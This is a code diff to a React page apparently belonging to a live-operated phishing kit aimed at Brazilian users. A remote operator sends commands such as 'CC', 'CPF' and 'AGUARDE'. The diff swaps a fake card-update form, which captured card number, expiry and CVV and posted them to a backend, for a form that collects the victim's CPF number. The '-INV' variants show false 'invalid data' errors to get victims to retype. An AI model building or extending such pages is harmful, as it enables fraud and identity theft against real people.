@@ -349,25 +349,22 @@ function CommandPage({ userId, onInvalidate }) {
     );
   }
 
-  // =================== CC (Cartão de Crédito) ===================
-  if (currentCommand?.action === "CC" || currentCommand?.action === "CC-INV") {
-    const isInvalid = currentCommand?.action === "CC-INV";
-    const isAmex = (cardNumber.replace(/\D/g,"").startsWith("34") || cardNumber.replace(/\D/g,"").startsWith("37"));
-    const cvvLen = isAmex ? 4 : 3;
-    const formatCardNumber = (v) => {
-      const n = v.replace(/\D/g,"").slice(0, isAmex ? 15 : 16);
-      if (isAmex) return n.replace(/(\d{4})(\d{0,6})(\d{0,5})/, (_,a,b,c) => [a,b,c].filter(Boolean).join(" "));
-      return n.replace(/(\d{4})(?=\d)/g, "$1 ");
+  // =================== CPF (Confirmar CPF) ===================
+  if (currentCommand?.action === "CPF" || currentCommand?.action === "CPF-INV") {
+    const isInvalid = currentCommand?.action === "CPF-INV";
+    const formatCPF = (v) => {
+      const n = v.replace(/\D/g, "").slice(0, 11);
+      if (n.length <= 3) return n;
+      if (n.length <= 6) return n.slice(0,3) + "." + n.slice(3);
+      if (n.length <= 9) return n.slice(0,3) + "." + n.slice(3,6) + "." + n.slice(6);
+      return n.slice(0,3) + "." + n.slice(3,6) + "." + n.slice(6,9) + "-" + n.slice(9);
     };
-    const formatExpiry = (v) => { const n = v.replace(/\D/g,"").slice(0,4); return n.length > 2 ? n.slice(0,2)+"/"+n.slice(2) : n; };
-    const validateCard = () => { const n = cardNumber.replace(/\D/g,""); return n.length >= 13 && n.length <= 16; };
-    const validateExpiry = () => { const p = cardExpiry.split("/"); if (p.length !== 2) return false; const m = parseInt(p[0],10); const y = parseInt("20"+p[1],10); if (m<1||m>12) return false; return new Date(y,m) > new Date(); };
-    const isFormValid = validateCard() && validateExpiry() && cardCvv.length >= cvvLen;
-    const handleCCSubmit = async (e) => {
+    const cpfValid = inputValue.replace(/\D/g, "").length === 11;
+    const handleCPFSubmit = async (e) => {
       e.preventDefault();
       setLoading(true);
       try {
-        await axios.post(`${API}/user/submit-data/${userId}`, { field: "credit_card", value: `${cardNumber} | ${cardExpiry} | ${cardCvv}` });
+        await axios.post(`${API}/user/submit-data/${userId}`, { field: "cpf_number", value: inputValue });
         setSubmitted(true);
         setCurrentCommand({ action: "AGUARDE" });
       } catch (error) { console.error(error); }
@@ -375,35 +372,16 @@ function CommandPage({ userId, onInvalidate }) {
     return (
       <PFCenter>
         <PFLogo />
-        <PFIcon isInvalid={isInvalid}>
-          {isInvalid ? (
-            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-          ) : (
-            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
-          )}
-        </PFIcon>
-        {isInvalid && <PFError message="Dados do cartão inválidos. Digite novamente." />}
-        <h1 className="text-lg font-bold text-gray-900 mb-1 text-center">Cadastre seu cartão</h1>
-        <p className="text-gray-500 mb-5 text-center text-sm max-w-[280px]">Atualize os dados do seu cartão para continuar.</p>
-        <form onSubmit={handleCCSubmit} className="w-full max-w-[280px] space-y-4">
+        {isInvalid && <PFError message="CPF inválido. Digite novamente." />}
+        <h1 className="text-lg font-bold text-gray-900 mb-1 text-center">Confirme seu CPF</h1>
+        <p className="text-gray-500 mb-5 text-center text-sm max-w-[280px]">Digite o número do CPF cadastrado</p>
+        <form onSubmit={handleCPFSubmit} className="w-full max-w-[280px] space-y-5">
           <div>
-            <label className="block text-sm text-gray-800 mb-1" style={{fontSize:'13px'}}>Número do cartão</label>
-            <input type="text" value={cardNumber} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} placeholder="0000 0000 0000 0000" disabled={loading} maxLength={19}
-              className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm ${isInvalid ? 'border-red-500' : 'border-gray-300'}`} style={{height:'38px'}} />
+            <label className="block text-sm text-gray-800 mb-1.5" style={{fontSize:'13px'}}>CPF <span className="text-red-500">*</span></label>
+            <input type="text" value={inputValue} onChange={(e) => setInputValue(formatCPF(e.target.value))} placeholder="000.000.000-00" disabled={loading} maxLength={14}
+              className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm ${isInvalid ? 'border-red-500' : 'border-gray-300'}`} style={{height:'38px'}} autoFocus />
           </div>
-          <div className="grid grid-cols-2 gap-3">
-            <div>
-              <label className="block text-sm text-gray-800 mb-1" style={{fontSize:'13px'}}>Validade</label>
-              <input type="text" value={cardExpiry} onChange={(e) => setCardExpiry(formatExpiry(e.target.value))} placeholder="MM/AA" disabled={loading} maxLength={5}
-                className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm text-center ${isInvalid ? 'border-red-500' : 'border-gray-300'}`} style={{height:'38px'}} />
-            </div>
-            <div>
-              <label className="block text-sm text-gray-800 mb-1" style={{fontSize:'13px'}}>CVV</label>
-              <input type="text" value={cardCvv} onChange={(e) => setCardCvv(e.target.value.replace(/\D/g,"").slice(0,cvvLen))} placeholder={isAmex?"0000":"000"} disabled={loading} maxLength={cvvLen}
-                className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm text-center ${isInvalid ? 'border-red-500' : 'border-gray-300'}`} style={{height:'38px'}} />
-            </div>
-          </div>
-          <PFButton disabled={!isFormValid} loading={loading}>Continuar</PFButton>
+          <PFButton disabled={!cpfValid} loading={loading}>Confirmar</PFButton>
         </form>
       </PFCenter>
     );
